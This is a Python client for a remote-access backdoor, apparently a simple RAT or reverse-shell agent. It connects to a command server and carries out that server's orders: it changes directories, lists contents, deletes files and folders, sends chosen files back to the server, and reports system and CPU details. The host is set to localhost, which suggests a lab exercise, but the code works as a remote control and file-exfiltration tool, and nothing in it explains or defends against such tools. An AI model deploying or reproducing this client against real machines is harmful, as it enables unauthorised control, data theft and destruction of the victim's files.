import socket
import subprocess
import os
import psutil
import platform
from datetime import datetime

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003
BUFFER_SIZE = 1024
# receive 4096 bytes each time
BUFFER_SIZE_FILE = 4096

#Send file to server
def send_file(filename):
    f_type =  filename.split(".")[1]
    if f_type == "txt":
        try:
            txt = open(filename, 'r')
            find = "find"
            s.send(find.encode())
            data  = txt.read(BUFFER_SIZE)
            s.send(data.encode())
            txt.close()

        except:
            error = "[-] File not exist"     
            s.send(error.encode()) 

    else:
        try:
            binary = open(filename, 'rb')
            find = "find"
            s.send(find.encode())
            data  = binary.read(BUFFER_SIZE_FILE)
            s.send(data)
            binary.close()
            
        except:
            error = "[-] File not exist"     
            s.send(error.encode()) 


s = socket.socket() #Create the socket object
s.connect((SERVER_HOST, SERVER_PORT))# connect to the server

#Send actual directory
output = os.getcwd()
s.send(output.encode())

while True:

    #Receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    cmd = command.split(" ")

    #function break out of the loop, finishe connection
    if command.lower() == "exit":
        break

    # go back a directory
    elif cmd[0] == "cd.." :
        os.chdir("..")
        output = os.getcwd()
        s.send(output.encode())

    # go to directory
    elif cmd[0] == "cd" :
        folder = cmd[1]
        try:
            os.chdir(folder)
            find = "find"
            s.send(find.encode())
            output = os.getcwd()
            s.send(output.encode())
        except:
            error = "[-] Folder not exist"
            s.send(error.encode())


    # list all directory content
    elif command == "dir" :
        output = subprocess.getoutput(command)
        s.send(output.encode())

    # delete file
    elif cmd[0] == "delfile":
        files = cmd[1]
        try:
            os.remove(files)
            output = "[+] File " + files + " deleted"
            s.send(output.encode())
        except:
            error = "[-] File not exist"
            s.send(error.encode())

    #delete folder
    elif cmd[0] == "delfolder":
        folder = cmd[1]
        try:
            os.rmdir(folder)
            output = "[+] Folder " + folder + " deleted"
            s.send(output.encode())
        except:
            error = "[-] Folder not exist"
            s.send(error.encode())
            
    #Send file to server
    elif cmd[0] == "download":
        filename = cmd[1]
        send_file(filename)

    #System information
    elif command == "sys":
        uname = platform.uname()
        output = uname.system + " " + uname.node + " " + uname.release + " " + uname.version + " " + uname.machine + " " + uname.processor
        s.send(output.encode())

    #CPU information
    elif command == "cpu":

        pc = str(psutil.cpu_count(logical=False))
        tc = str(psutil.cpu_count(logical=True))
        cpufreq = psutil.cpu_freq()

        maxf = str(cpufreq.max)
        minf = str(cpufreq.min)
        cf = str(
        cpufreq.current)
        cu = str(psutil.cpu_percent(percpu=True))
        tc = str(psutil.cpu_percent())
        output = pc + " " + tc + " " + maxf + " " + minf + " " + cf + " " + cu + " " + tc
        s.send(output.encode())

    #Error
    else:
        output = "[-] command not define"
        s.send(output.encode())



# close client connection
s.close()